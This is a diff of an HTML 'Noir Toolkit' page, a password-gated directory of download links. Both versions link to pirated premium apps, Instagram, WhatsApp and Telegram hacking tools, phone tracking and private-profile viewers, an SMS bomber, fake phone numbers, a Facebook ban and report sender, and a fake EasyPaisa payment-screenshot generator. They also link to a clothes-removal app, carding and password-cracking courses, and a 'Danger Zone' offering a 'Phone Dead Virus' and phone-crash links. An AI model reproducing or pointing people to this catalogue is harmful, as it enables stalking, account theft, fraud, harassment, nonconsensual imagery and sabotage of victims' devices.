@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Burhan Noir Toolkit | Expanded</title>
+<title>Burhan Noir Toolkit | Clean Version</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
 
@@ -30,7 +30,7 @@ body{
 }
 .card{
     width:95%;
-    max-width:500px;
+    max-width:480px;
     background:rgba(0,0,0,.9);
     border-radius:20px;
     padding:22px;
@@ -38,26 +38,30 @@ body{
     text-align:center;
     max-height: 90vh;
     overflow-y: auto;
-    position: relative;
 }
 .card::-webkit-scrollbar { width: 5px; }
 .card::-webkit-scrollbar-thumb { background: #0ff; border-radius: 10px; }
 
-h1, h2 {
-    margin:10px 0;
-    text-shadow:0 0 12px #00ffff;
-}
+h1, h2 { margin:10px 0; text-shadow:0 0 12px #00ffff; }
 
-.category-title {
-    font-size: 14px;
+.category-header {
+    display: block;
+    margin: 25px 0 10px;
     color: #ff00ff;
-    text-shadow: 0 0 8px #ff00ff;
-    margin-top: 25px;
-    margin-bottom: 10px;
-    border-bottom: 1px solid #ff00ff;
-    padding-bottom: 5px;
+    font-size: 13px;
     text-transform: uppercase;
     letter-spacing: 2px;
+    border-bottom: 1px solid rgba(255, 0, 255, 0.4);
+    padding-bottom: 5px;
+    text-align: left;
+}
+
+.search-box {
+    position: sticky;
+    top: -22px;
+    z-index: 100;
+    background: rgba(0,0,0,1);
+    padding: 10px 0;
 }
 
 input{
@@ -66,31 +70,32 @@ input{
     border:none;
     outline:none;
     border-radius:14px;
-    background:#000;
+    background:#111;
     color:#0ff;
     font-size:15px;
-    margin-top:14px;
-    box-shadow:0 0 12px #00ffff inset;
+    margin-top:10px;
+    box-shadow:0 0 10px #00ffff inset;
 }
+
 .btn{
     width:100%;
-    padding:18px;
-    margin-top:12px;
+    padding:16px;
+    margin-top:10px;
     border:none;
-    border-radius:18px;
+    border-radius:15px;
     background:#000;
     color:#0ff;
     font-size:13px;
     font-weight: 700;
     cursor:pointer;
-    box-shadow:0 0 12px #00ffff;
+    box-shadow:0 0 10px #00ffff;
     transition:.25s;
     display:block;
     text-decoration:none;
     text-transform: uppercase;
+    white-space: nowrap;
     overflow: hidden;
     text-overflow: ellipsis;
-    white-space: nowrap;
 }
 .btn:hover{
     background:#00ffff;
@@ -98,18 +103,7 @@ input{
     transform:scale(1.02);
 }
 .tools{display:none}
-footer{
-    margin-top:25px;
-    font-size:11px;
-    opacity:.7;
-}
-.search-container {
-    position: sticky;
-    top: -22px;
-    background: rgba(0,0,0,0.95);
-    padding: 10px 0;
-    z-index: 100;
-}
+footer{ margin-top:25px; font-size:11px; opacity:.7; }
 </style>
 </head>
 
@@ -121,74 +115,62 @@ footer{
     <p>System Authentication Required</p>
     <input type="password" id="pass" placeholder="Enter password">
     <button class="btn" onclick="check()">Access Toolkit</button>
-    <button class="btn" onclick="join()">Join Noir Network</button>
     <footer>Developed by Burhan Noir</footer>
 </div>
 
 <div class="card tools" id="tools">
-    <div class="search-container">
+    <div class="search-box">
         <h2>NOIR TOOLKIT</h2>
-        <input type="text" id="search" placeholder="Search system resources..." onkeyup="filterTools()">
+        <input type="text" id="search" placeholder="Filter Noir Database..." onkeyup="filterTools()">
     </div>
 
     <div id="toolList">
         
-        <div class="category-title">Premium Access</div>
-        <a class="btn" href="https://www.mediafire.com/file/bcmddy9r7onqutd/N3tfl%2521x_premium_by_%2540zerox.apk/file" target="_blank">Noir Netflix Premium</a>
-        <a class="btn" href="https://www.mediafire.com/file/ep8skhavdtp9c7m/Youtube_5.3.80.132.apk/file" target="_blank">Noir YouTube Premium</a>
-        <a class="btn" href="https://dupload.net/tec57wind8s0" target="_blank">ChatGPT Premium (Dupload)</a>
-        <a class="btn" href="https://zerox-courses.blogspot.com/2025/07/chatgpt-plus-method-by-zerox-body.html?m=1" target="_blank">ChatGPT Plus Method</a>
+        <span class="category-header">Premium Access</span>
+        <a class="btn" href="https://www.mediafire.com/file/bcmddy9r7onqutd/N3tfl%2521x_premium_by_%2540zerox.apk/file" target="_blank">Netflix Premium</a>
+        <a class="btn" href="https://www.mediafire.com/file/ep8skhavdtp9c7m/Youtube_5.3.80.132.apk/file" target="_blank">YouTube Premium</a>
         <a class="btn" href="https://www.mediafire.com/file/x5rl62lab695l5k/SPOTIFY_PREMIUM_BY_%2540ZEROX.apk/file" target="_blank">Spotify Premium</a>
-        <a class="btn" href="https://www.mediafire.com/file/9g05x7xdb78pllo/Capcut_Premium_%2540InsightX_By_Hamza.apk/file" target="_blank">CapCut Pro Android</a>
-        <a class="btn" href="https://www.mediafire.com/file/7gdp7p4up6uswba/CAPCUT_PRO_FOR_IOS_BY_DARK_LEGEND.apk/file" target="_blank">CapCut Pro iOS</a>
-        <a class="btn" href="https://jarmod.com/" target="_blank">All Premium Apps Site</a>
+        <a class="btn" href="https://www.mediafire.com/file/9bdrtv6g6mtmjoz/ChatGPT+Premium_1.0.11.apk/file" target="_blank">ChatGPT Premium APK</a>
+        <a class="btn" href="https://zerox-courses.blogspot.com/2025/07/chatgpt-plus-method-by-zerox-body.html" target="_blank">ChatGPT Plus Method</a>
+        <a class="btn" href="https://www.mediafire.com/file/9g05x7xdb78pllo/Capcut_Premium.apk/file" target="_blank">CapCut Pro Android</a>
+        <a class="btn" href="https://www.mediafire.com/file/7gdp7p4up6uswba/CAPCUT_PRO_FOR_IOS.apk/file" target="_blank">CapCut Pro iOS</a>
+        <a class="btn" href="https://www.mediafire.com/file/bjgg3kx4s06y3m5/PICSART_PRO.apk/file" target="_blank">Picsart Pro</a>
+        <a class="btn" href="https://jarmod.com/" target="_blank">Vault: All Premium Apps</a>
 
-        <div class="category-title">Hacking & Tracing</div>
-        <a class="btn" href="https://www.mediafire.com/file/0870qd38lw6j54w/Instagram_Hack.7z/file" target="_blank">Hack Insta Account</a>
-        <a class="btn" href="https://drive.google.com/drive/folders/1N_S5B31SDdNd7tZ25YBNwrJdL4AnlK4g?usp=sharing" target="_blank">Live Location Hack</a>
-        <a class="btn" href="https://www.mediafire.com/folder/r01749bcfuygl/Track+Mobile" target="_blank">Trace Any Mobile</a>
-        <a class="btn" href="https://www.mediafire.com/file/f9pziak22eonjrm/HOW_TO_FIND_ANYONE_LOCATION_TRACK_WITH_OWN_MOBILE_PHONE.zip/file" target="_blank">Trace Location Method</a>
-        <a class="btn" href="https://gplinks.co/ahyxz" target="_blank">WhatsApp Hack Method 1</a>
-        <a class="btn" href="https://gplinks.co/HwkB88U" target="_blank">WhatsApp Hack Method 2</a>
-        <a class="btn" href="https://www.mediafire.com/file/i9rb75gcz23a824/Telegram_Hack.7z/file" target="_blank">Telegram Hack</a>
-        <a class="btn" href="https://www.mediafire.com/file/ifxvks1slvqfgj8/LIVE_SCREEN_HACK.zip/file" target="_blank">Live Screen Hack</a>
-        <a class="btn" href="https://www.mediafire.com/file/m5elnssx6cft6ij/PAID_Wi-Fi_HACK.zip/file" target="_blank">Paid WiFi Hack</a>
-        <a class="btn" href="https://www.mediafire.com/file_premium/vfsmk9dnxvbwneg/See_private.apk/file" target="_blank">See Private Instagram</a>
+        <span class="category-header">Hacking & Tracing</span>
+        <a class="btn" href="https://www.mediafire.com/file/0870qd38lw6j54w/Instagram_Hack.7z/file" target="_blank">Instagram Hack Tool</a>
+        <a class="btn" href="https://www.mediafire.com/file_premium/vfsmk9dnxvbwneg/See_private.apk/file" target="_blank">Private Insta Viewer</a>
+        <a class="btn" href="https://www.mediafire.com/folder/r01749bcfuygl/Track+Mobile" target="_blank">Global Mobile Tracker</a>
+        <a class="btn" href="https://drive.google.com/drive/folders/1N_S5B31SDdNd7tZ25YBNwrJdL4AnlK4g" target="_blank">Live Location Hack</a>
+        <a class="btn" href="https://gplinks.co/ahyxz" target="_blank">WhatsApp Hack Method</a>
+        <a class="btn" href="https://www.mediafire.com/file/i9rb75gcz23a824/Telegram_Hack.7z/file" target="_blank">Telegram Hack Tool</a>
+        <a class="btn" href="https://www.mediafire.com/file/m5elnssx6cft6ij/PAID_Wi-Fi_HACK.zip/file" target="_blank">Paid WiFi Hacker</a>
 
-        <div class="category-title">Account Methods</div>
-        <a class="btn" href="https://www.mediafire.com/file/7o170c2ekmfdh2v/UNLIMITED+GMAIL+METHOD+1+BY+JADOON.zip/file" target="_blank">Make Unlimited Gmails</a>
-        <a class="btn" href="https://drive.google.com/drive/u/0/mobile/folders/1niW65YXmMfW87OMhOn9VNv0MMbl8mQRB?usp=sharing" target="_blank">New Unlimited Gmails</a>
-        <a class="btn" href="https://drive.google.com/drive/folders/178fzkAsc081AiZD28XD6gfsgW3A_qV98" target="_blank">+48 Numbers Trick</a>
-        <a class="btn" href="https://mega.nz/folder/zwg3FCAQ#KC2COdwxjYzKIxhiejYTxA" target="_blank">All Fake Numbers Method</a>
+        <span class="category-header">Account Methods</span>
         <a class="btn" href="https://wp-unban-mu.vercel.app/" target="_blank">WhatsApp Unban Tool</a>
+        <a class="btn" href="https://www.mediafire.com/file/7o170c2ekmfdh2v/UNLIMITED+GMAIL+METHOD.zip/file" target="_blank">Unlimited Gmail Generator</a>
+        <a class="btn" href="https://mega.nz/folder/zwg3FCAQ#KC2COdwxjYzKIxhiejYTxA" target="_blank">Global Fake Numbers</a>
         <a class="btn" href="https://www.mediafire.com/folder/kxznkgynq4fap/Fb+Ban+Method" target="_blank">Facebook Ban Method</a>
+        <a class="btn" href="https://fb-tool-drab.vercel.app/" target="_blank">FB Report Sender</a>
 
-        <div class="category-title">AI & Utility Tools</div>
-        <a class="btn" href="https://tex-to-video.vercel.app/" target="_blank">Text to Video AI</a>
-        <a class="btn" href="https://smallshorts.com/0tBO94G" target="_blank">Text to Video AI Mod</a>
+        <span class="category-header">Utility & AI</span>
+        <a class="btn" href="https://tex-to-video.vercel.app/" target="_blank">Text To Video AI</a>
+        <a class="btn" href="https://sms-bombing.vercel.app/" target="_blank">Noir SMS Bomber</a>
         <a class="btn" href="https://ai-logo-delta.vercel.app/" target="_blank">AI Logo Generator</a>
-        <a class="btn" href="https://sms-bombing.vercel.app/" target="_blank">SMS Bomber</a>
-        <a class="btn" href="https://ytthumbnl.vercel.app/" target="_blank">YouTube Thumbnail Downloader</a>
-        <a class="btn" href="https://www.mediafire.com/file/4mal5k4hc62nc91/Funsta_3.5.3.apk/file" target="_blank">Create Fake Instagram</a>
-        <a class="btn" href="https://www.mediafire.com/file/4eobtvyo8qqfcmy/EasyPaisa_to_All_bank_By_Jabir.apk/file" target="_blank">Fake Easypaisa SS</a>
-        <a class="btn" href="https://www.mediafire.com/file/d4zsedauucyi947/Mask_%2526_Cloth_Remover.apk/file" target="_blank">Clothes & Mask Remover</a>
+        <a class="btn" href="https://ytthumbnl.vercel.app/" target="_blank">YT Thumbnail Downloader</a>
+        <a class="btn" href="https://www.mediafire.com/file/4eobtvyo8qqfcmy/EasyPaisa_SS_Gen.apk/file" target="_blank">EasyPaisa SS Generator</a>
+        <a class="btn" href="https://www.mediafire.com/file/d4zsedauucyi947/Mask_Cloth_Remover.apk/file" target="_blank">Clothes Remover AI</a>
 
-        <div class="category-title">Educational Courses</div>
+        <span class="category-header">Hacking Courses</span>
         <a class="btn" href="https://drive.google.com/drive/folders/1zD-JrP4sgIlAedjaLxAMdg_4ArF9IYyN" target="_blank">Ethical Hacking Course</a>
-        <a class="btn" href="https://www.mediafire.com/folder/372e5n0e7f3nk/Network+Hacking+Course+2025" target="_blank">Network Hacking (Urdu)</a>
         <a class="btn" href="https://drive.google.com/drive/folders/1ycC5W6bT2anWli1RYARcw0KhvLuWQp6A" target="_blank">Website Hacking Course</a>
-        <a class="btn" href="https://drive.google.com/drive/folders/1ZU99WiLZMt0XTJw6uIpPOmMu02bem5J9" target="_blank">Wi-Fi Hacking Course</a>
-        <a class="btn" href="https://drive.google.com/drive/u/0/mobile/folders/1aUze8xOOZle-vB43eaZAqthORM24LYzI" target="_blank">Carding Course</a>
         <a class="btn" href="https://drive.google.com/drive/folders/1yR5oL00yzr83QzHL5CVAztnpeQCW4Iyo" target="_blank">Password Cracking Course</a>
-        <a class="btn" href="https://zerox-courses.blogspot.com/2025/07/trading-course-by-zerox-body-margin-0.html" target="_blank">Trading Course</a>
         <a class="btn" href="https://www.mediafire.com/folder/xhenh4efgw6t7/800+Corse" target="_blank">800+ Premium Courses</a>
 
-        <div class="category-title" style="color:#ff0000; text-shadow: 0 0 8px #ff0000;">Danger Zone</div>
+        <span class="category-header" style="color:#f00; border-color:#f00;">Danger Zone</span>
         <a class="btn" href="https://www.mediafire.com/file/kkk6l40duq1sxg3/WhatsApp_1.0.apk/file" target="_blank">Phone Dead Virus</a>
-        <a class="btn" href="https://saddam.web1337.net/" target="_blank">Phone Crash Link (Don't Visit)</a>
-        <a class="btn" href="https://mega.nz/file/wSVmETxT#TKkXwq6ZosCzAlh_lk58V009eUmAqF6vgkuvPWV4aO4" target="_blank">Gallery Crash APK</a>
-        <a class="btn" href="https://www.mediafire.com/file/ua3grks0dz5h0hh/gallery+crash.zip/file" target="_blank">Mobile Crash File</a>
-
+        <a class="btn" href="https://saddam.web1337.net/" target="_blank">Instant Phone Crash</a>
+        <a class="btn" href="https://mega.nz/file/wSVmETxT#TKkXwq6ZosCzAlh_lk58V009eUmAqF6vgkuvPWV4aO4" target="_blank">Gallery Crash Virus</a>
     </div>
 
     <footer>© BURHAN NOIR NETWORK 2026</footer>
@@ -209,7 +191,7 @@ function clickFx(){
 
 function check(){
     clickFx();
-    if(document.getElementById("pass").value===PASSWORD){
+    if(document.getElementById("pass").value.toLowerCase()===PASSWORD){
         document.getElementById("login").style.display="none";
         document.getElementById("tools").style.display="block";
     }else{
@@ -217,36 +199,18 @@ function check(){
     }
 }
 
-// Support Enter Key
-document.getElementById("pass").addEventListener("keyup", function(event) {
-    if (event.key === "Enter") {
-        check();
-    }
-});
-
-function join(){
-    clickFx();
-    window.open("https://chat.whatsapp.com/HVM9Spvm7HVGLERj8yo9kS","_blank");
-}
-
 function filterTools(){
     let input = document.getElementById("search").value.toLowerCase();
     let tools = document.querySelectorAll("#toolList .btn");
-    let categories = document.querySelectorAll(".category-title");
+    let headers = document.querySelectorAll(".category-header");
 
     tools.forEach(t => {
         t.style.display = t.textContent.toLowerCase().includes(input) ? "block" : "none";
     });
 
-    // Hide categories if no tools under them are visible
-    categories.forEach(cat => {
-        let next = cat.nextElementSibling;
-        let hasVisible = false;
-        while(next && !next.classList.contains('category-title')) {
-            if(next.style.display !== 'none') hasVisible = true;
-            next = next.nextElementSibling;
-        }
-        cat.style.display = hasVisible ? "block" : "none";
+    // Hide headers if searching
+    headers.forEach(h => {
+        h.style.display = input === "" ? "block" : "none";
     });
 }
 </script>
